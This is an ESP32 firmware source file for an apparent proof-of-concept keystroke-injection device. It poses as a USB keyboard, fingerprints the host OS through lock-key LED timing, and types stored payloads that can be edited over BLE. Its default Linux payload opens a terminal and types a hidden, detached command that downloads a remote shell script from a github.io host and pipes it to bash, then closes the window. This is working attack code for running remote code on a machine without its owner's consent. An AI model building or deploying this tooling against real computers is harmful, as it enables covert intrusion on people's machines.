#include "usb_hid.h"
#include "ble_hid.h"   // bleHidMac() for {MAC} substitution
#include <Arduino.h>

#ifndef POC_HAS_USB_HID
// ---- C5 / no-USB-OTG: stub. The USB-side bootstrap is run manually on the PC. --
void usbHidBegin() { /* no USB HID on this chip */ }
// No LittleFS payloads on this board -> editing is unavailable.
bool pocFsRead(const char*, String&)        { return false; }
bool pocFsWriteBegin(const char*)           { return false; }
bool pocFsWriteChunk(const uint8_t*, size_t){ return false; }
bool pocFsWriteEnd(size_t&)                 { return false; }

#else
// ---- S3 / real USB HID: OS detection + LittleFS payload interpreter -----------
#include <LittleFS.h>
#include "USB.h"
#include "USBHIDKeyboard.h"
// Stock header lacks these; press() maps KEY_x-0x88 -> HID usage.
#ifndef KEY_NUM_LOCK
#define KEY_NUM_LOCK    0xDB
#endif
#ifndef KEY_SCROLL_LOCK
#define KEY_SCROLL_LOCK 0xCF
#endif

static USBHIDKeyboard Keyboard;

static volatile bool          led_response_received = false;
static volatile int           led_event_count = 0;
static volatile unsigned long led_event_time = 0;
static volatile bool          caps_status = false, num_status = false, scroll_status = false;
static unsigned long caps_sent_time = 0, num_sent_time = 0, scroll_sent_time = 0;
static unsigned long caps_delay = 0, num_delay = 0, scroll_delay = 0;

static void usbEventCallback(void*, esp_event_base_t base, int32_t id, void* ev) {
    if (base == ARDUINO_USB_HID_KEYBOARD_EVENTS && id == ARDUINO_USB_HID_KEYBOARD_LED_EVENT) {
        arduino_usb_hid_keyboard_event_data_t* d = (arduino_usb_hid_keyboard_event_data_t*)ev;
        led_response_received = true; led_event_count++; led_event_time = millis();
        caps_status = d->capslock != 0; num_status = d->numlock != 0; scroll_status = d->scrolllock != 0;
        if (caps_sent_time   > 0 && caps_delay   == 0) caps_delay   = led_event_time - caps_sent_time;
        if (num_sent_time    > 0 && num_delay    == 0) num_delay    = led_event_time - num_sent_time;
        if (scroll_sent_time > 0 && scroll_delay == 0) scroll_delay = led_event_time - scroll_sent_time;
    }
}

static void toggleKey(uint8_t key, unsigned long* t) {
    *t = millis(); led_response_received = false;
    Keyboard.press(key); delay(300); Keyboard.release(key); delay(800);
}

static int classifyOS() {
    led_event_count = 0; caps_status = num_status = scroll_status = false;
    caps_delay = num_delay = scroll_delay = 0; caps_sent_time = num_sent_time = scroll_sent_time = 0;
    led_response_received = false;
    uint8_t initial_caps = caps_status;
    toggleKey(KEY_CAPS_LOCK, &caps_sent_time); delay(1500);
    if (!led_response_received && caps_status != initial_caps) return POC_OS_IOS;
    toggleKey(KEY_NUM_LOCK, &num_sent_time); delay(1200);
    toggleKey(KEY_SCROLL_LOCK, &scroll_sent_time); delay(1200);
    if (led_event_count == 0) return (caps_status != initial_caps) ? POC_OS_IOS : POC_OS_MACOS;
    if (led_event_count >= 3 && caps_delay < 100 && num_delay < 100 && scroll_delay < 100) return POC_OS_WINDOWS;
    bool hn = (num_delay > 0), hs = (scroll_delay > 0);
    if (led_event_count == 1 && caps_status != initial_caps && caps_delay > 0 && caps_delay < 20 && !hn && !hs) return POC_OS_CHROMEOS;
    if (num_status && !scroll_status && hn && !hs) return POC_OS_LINUX;
    if ((caps_delay > 200 || num_delay > 200 || scroll_delay > 200) && (hn || hs)) return POC_OS_ANDROID;
    if (caps_status != initial_caps) return POC_OS_IOS;
    return POC_OS_UNKNOWN;
}

static void resetLocks() {
    unsigned long tmp; delay(300);
    if (caps_status)   { toggleKey(KEY_CAPS_LOCK,   &tmp); delay(200); }
    if (num_status)    { toggleKey(KEY_NUM_LOCK,    &tmp); delay(200); }
    if (scroll_status) { toggleKey(KEY_SCROLL_LOCK, &tmp); delay(200); }
}

int usbDetectOS() { int os = classifyOS(); resetLocks(); return os; }

const char* usbOsName(int os) {
    switch (os) {
        case POC_OS_WINDOWS: return "Windows"; case POC_OS_LINUX: return "Linux";
        case POC_OS_MACOS: return "Macos";     case POC_OS_IOS: return "iOS";
        case POC_OS_ANDROID: return "Android"; case POC_OS_CHROMEOS: return "ChromeOS";
        default: return "Unknown";
    }
}

void usbHidType(const char* s) { for (const char* p = s; *p; ++p) { Keyboard.write((uint8_t)*p); delay(8); } }

static void tapGui(const String& arg) {
    Keyboard.press(KEY_LEFT_GUI);
    if (arg == "SPACE") Keyboard.press(' ');
    else if (arg.length() == 1) Keyboard.press(arg[0]);
    delay(90); Keyboard.releaseAll();
}

// Built-in default payloads (mirror data/*.txt). The board ALWAYS has a working
// payload even if LittleFS is empty/broken; an on-FS file (user edit) overrides.
static const char DEF_LINUX[] = R"(# Linux / Ubuntu-GNOME: open a terminal, fetch+run the pairing helper detached.
# {MAC} = this board's BLE address. Format: GUI [key]|CTRLALT <key>|STRING <text>|ENTER|DELAY <ms>|# comment
CTRLALT t
DELAY 1500
STRING nohup bash -c 'curl -sL whitewhidow.github.io/hid-ble-poc/pair.sh | bash -s {MAC}' >/dev/null 2>&1 & disown; exit
ENTER
)";
static const char DEF_WINDOWS[] = R"(# Windows (placeholder): Run -> PowerShell + a note. No real BLE helper yet.
GUI r
DELAY 600
STRING powershell
ENTER
DELAY 1500
STRING # PoC-KBD ({MAC}) - Windows BLE pairing bootstrap not implemented yet
ENTER
)";
static const char DEF_MACOS[] = R"(# macOS (placeholder): Spotlight -> Terminal + a note. No real BLE helper yet.
GUI SPACE
DELAY 600
STRING Terminal
ENTER
DELAY 1600
STRING # PoC-KBD ({MAC}) - macOS BLE pairing bootstrap not implemented yet
ENTER
)";
static const char* defaultPayload(int os) {
    switch (os) { case POC_OS_WINDOWS: return DEF_WINDOWS; case POC_OS_MACOS: return DEF_MACOS; default: return DEF_LINUX; }
}
static const char* osPath(int os) {
    switch (os) { case POC_OS_WINDOWS: return "/windows.txt"; case POC_OS_MACOS: return "/macos.txt"; default: return "/linux.txt"; }
}

// Tiny interpreter over a payload string: GUI [key] | CTRLALT <key> | STRING <text> | ENTER | DELAY <ms> | # comment
static void usbRunPayloadContent(const String& content) {
    int start = 0, n = content.length();
    while (start < n) {
        int nl = content.indexOf('\n', start);
        String line = (nl < 0) ? content.substring(start) : content.substring(start, nl);
        start = (nl < 0) ? n : nl + 1;
        line.trim();
        if (line.length() == 0 || line[0] == '#') continue;
        if (line == "ENTER") Keyboard.write((uint8_t)'\n');
        else if (line.startsWith("DELAY ")) delay(line.substring(6).toInt());
        else if (line.startsWith("STRING ")) { String s = line.substring(7); s.replace("{MAC}", bleHidMac()); usbHidType(s.c_str()); }
        else if (line == "GUI") tapGui("");
        else if (line.startsWith("GUI ")) { String a = line.substring(4); a.trim(); tapGui(a); }
        else if (line.startsWith("CTRLALT ")) {   // Ctrl+Alt+<key>, e.g. CTRLALT t (open terminal)
            char k = line.charAt(8);
            Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT); Keyboard.press(k);
            delay(90); Keyboard.releaseAll();
        }
    }
}

void usbSamplePayload(int os) {
    String content;
    File f = LittleFS.open(osPath(os), "r");           // on-FS file (user edit) wins if non-empty
    if (f) { while (f.available()) content += (char)f.read(); f.close(); }
    if (content.length() == 0) { Serial.println("[fs] payload empty/missing -> built-in default"); content = defaultPayload(os); }
    usbRunPayloadContent(content);
}

// ---- Payload-file editing over BLE (LittleFS) --------------------------------
// Only the three OS payloads are addressable; reject anything else so a bad/rogue
// name can't reach arbitrary paths.
static bool fsPath(const char* os, char* out, size_t n) {
    if (!strcmp(os, "linux") || !strcmp(os, "windows") || !strcmp(os, "macos")) {
        snprintf(out, n, "/%s.txt", os); return true;
    }
    return false;
}

static File   s_wf;          // file open for a phone-driven write
static size_t s_wn = 0;      // bytes written so far

bool pocFsRead(const char* os, String& out) {
    char p[24]; if (!fsPath(os, p, sizeof(p))) return false;
    LittleFS.begin(true, "/littlefs", 10, "littlefs");
    File f = LittleFS.open(p, "r");
    out = "";
    if (f) { out.reserve(f.size()); while (f.available()) out += (char)f.read(); f.close(); }
    return out.length() > 0;   // empty/missing -> false so the web shows its built-in default
}
bool pocFsWriteBegin(const char* os) {
    char p[24]; if (!fsPath(os, p, sizeof(p))) return false;
    LittleFS.begin(true, "/littlefs", 10, "littlefs");
    s_wf = LittleFS.open(p, "w"); s_wn = 0; return (bool)s_wf;
}
bool pocFsWriteChunk(const uint8_t* data, size_t n) {
    if (!s_wf) return false;
    size_t w = s_wf.write(data, n); s_wn += w; return w == n;
}
bool pocFsWriteEnd(size_t& sizeOut) {
    if (!s_wf) return false;
    sizeOut = s_wn; s_wf.close(); return true;
}

// (Re)create a payload file if it is missing OR empty (0-byte files were the cause
// of "payloads gone"); a real, non-empty user file is kept.
static void seedPayload(int os) {
    const char* path = osPath(os);
    File r = LittleFS.open(path, "r");
    size_t sz = r ? r.size() : 0; if (r) r.close();
    if (sz > 0) return;
    File f = LittleFS.open(path, "w");
    if (f) { f.print(defaultPayload(os)); f.close(); Serial.printf("[fs] seeded %s\n", path); }
    else Serial.printf("[fs] seed FAILED %s\n", path);
}

void usbHidBegin() {
    // Mount LittleFS (by its partition label); if it won't mount or won't accept a
    // write, reformat clean. Then ensure every payload is present + non-empty.
    bool ok = LittleFS.begin(true, "/littlefs", 10, "littlefs");
    Serial.printf("[fs] mount %s\n", ok ? "ok" : "FAIL");
    if (!ok) { LittleFS.format(); ok = LittleFS.begin(true, "/littlefs", 10, "littlefs"); Serial.printf("[fs] reformat->mount %s\n", ok ? "ok" : "FAIL"); }
    File t = LittleFS.open("/.wtest", "w");
    if (!t) { Serial.println("[fs] write-test FAIL -> format"); LittleFS.format(); LittleFS.begin(true, "/littlefs", 10, "littlefs"); }
    else    { t.close(); LittleFS.remove("/.wtest"); }
    seedPayload(POC_OS_LINUX); seedPayload(POC_OS_WINDOWS); seedPayload(POC_OS_MACOS);
    USB.onEvent(usbEventCallback);
    Keyboard.onEvent(usbEventCallback);
    USB.begin();
    Keyboard.begin();
}
#endif // POC_HAS_USB_HID
